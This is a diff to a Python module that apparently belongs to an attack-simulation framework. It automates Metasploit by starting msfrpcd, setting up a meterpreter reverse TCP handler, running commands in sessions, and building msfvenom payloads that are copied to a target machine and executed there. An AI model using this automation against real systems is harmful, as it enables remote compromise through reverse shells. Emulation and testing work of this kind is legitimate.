@@ -2,6 +2,12 @@
 
 from pymetasploit3.msfrpc import MsfRpcClient
 from app.machinecontrol import Machine
+from app.attack_log import AttackLog
+from app.interface_sfx import CommandlineColors
+import time
+
+
+import os
 
 # https://github.com/DanMcInerney/pymetasploit3
 
@@ -19,29 +25,83 @@ class Metasploit():
         :param kwargs: Relevant ones: uri, port, server, username
         """
 
-        self.client = MsfRpcClient(password, **kwargs)
+        self.password = password
+        self.kwargs = kwargs
+        self.client = None
 
+        # Optional attacker: If a running attacker machine is passed, we take it and start the msfrpcd
+        # Alternative: The server is taken and we expect an already running msfrpcd there
+        self.attacker = kwargs.get("attacker", None)
+        if self.attacker:
+            # we expect a running attacker but without a running msfrcpd
+            self.start_msfrpcd(kwargs.get("username"))
+            kwargs["server"] = self.attacker.get_ip()
+            time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
+
+        self.get_client()
+        # self.client = MsfRpcClient(password, **kwargs)
+        # TODO: Improve speed and reliability with exception handling and retries
         # Waiting for reverse shell
-        exploit = self.client.modules.use('exploit', 'exploit/multi/handler')
-        print(exploit.description)
-        print(exploit.missing_required)
-        payload = self.client.modules.use('payload', 'linux/x64/meterpreter_reverse_tcp')
-        print(payload.description)
-        print(payload.missing_required)
-        payload["LHOST"] = "192.168.178.125"
+        self.exploit_stub_for_external_payload()
 
+        print("Meterpreter executing")
+        print(self.meterpreter_execute("getuid", 0))
+        print("Done")
+
+    def exploit_stub_for_external_payload(self, exploit='exploit/multi/handler', payload='linux/x64/meterpreter_reverse_tcp'):
+        exploit = self.client.modules.use('exploit', exploit)
+        # print(exploit.description)
+        # print(exploit.missing_required)
+        payload = self.client.modules.use('payload', payload)
+        # print(payload.description)
+        # print(payload.missing_required)
+        payload["LHOST"] = self.attacker.get_ip()
         res = exploit.execute(payload=payload)
         print(res)
-        print(self.client.sessions.list)
-        sid = list(self.client.sessions.list)[0]
 
-        shell = self.client.sessions.session(sid)
-        shell.write("getuid")
-        print(shell.read())
+    def start_msfrpcd(self, username):
+        """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """
+
+        cmd = f"msfrpcd -P {self.password} -U {username} -S"
+
+        self.attacker.remote_run(cmd, disown=True)
+
+    def get_client(self):
+        """ Get a local metasploit client connected to the metasploit server """
+        if self.client:
+            return self.client
+        self.client = MsfRpcClient(self.password, **self.kwargs)
+        return self.client
+
+    def get_sid(self, number=0):
+        """ Get the first session between hacked target and the metasploit server
+
+        @param number: number of the session to get
+        """
+
+        # TODO improve stability and speed
+        while len(self.client.sessions.list) <= number:
+            # print(self.client.sessions.list)
+            # print("Waiting for session")
+            time.sleep(1)
+        return list(self.client.sessions.list)[number]
+
+    def meterpreter_execute(self, cmd: str, session_number: int) -> str:
+        """ Executes a command on the meterpreter, returns result read from shell
+
+        @param cmd: command to execute
+        @param session_number: session number
+        @:return: the string result
+        """
+        shell = self.client.sessions.session(self.get_sid(session_number))
+        shell.write(cmd)
+        return shell.read()
+
+##########################################################################
 
 
 class MSFVenom():
-    def __init__(self, attacker: Machine, target: Machine):
+    def __init__(self, attacker: Machine, target: Machine, attack_logger: AttackLog):
         """
 
         :param attacker: attacker machine
@@ -50,6 +110,7 @@ class MSFVenom():
 
         self.attacker = attacker
         self.target = target
+        self.attack_logger = attack_logger
 
     def generate_cmd(self, **kwargs):
         """ Generates a cmd
@@ -62,7 +123,7 @@ class MSFVenom():
         platform = kwargs.get("platform", self.target.get_os())
         lhost = kwargs.get("lhost", self.attacker.get_ip())
         format = kwargs.get("format", None)  # file format
-        outfile = kwargs.get("outfile", "exploit.exe")
+        outfile = kwargs.get("outfile", "payload.exe")
 
         cmd = "msfvenom"
         if architecture is not None:
@@ -116,3 +177,32 @@ class MSFVenom():
         cmd = self.generate_cmd(**kwargs)
 
         self.attacker.remote_run(cmd)
+
+    def generate_and_deploy(self, **kwargs):
+        """ Will generate the payload and directly deploy it to the target
+
+        :return:
+        """
+        self.generate_payload(**kwargs)
+
+        payload_name = kwargs.get("outfile", "payload.exe")
+
+        self.attacker.get(payload_name, self.target.get_machine_path_external())
+        src = os.path.join(self.target.get_machine_path_external(), payload_name)
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Generated {payload_name}...deploying it{CommandlineColors.ENDC}",
+            1)
+        # Deploy to target
+        self.target.put(src, self.target.get_playground())
+
+        # TODO run on target
+        if self.target.get_playground() is not None:
+            cmd = f"cd {self.target.get_playground()};"
+        else:
+            cmd = ""
+        cmd += f"chmod +x {payload_name}; ./{payload_name}"
+        self.target.remote_run(cmd, disown=True)
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
+            1)
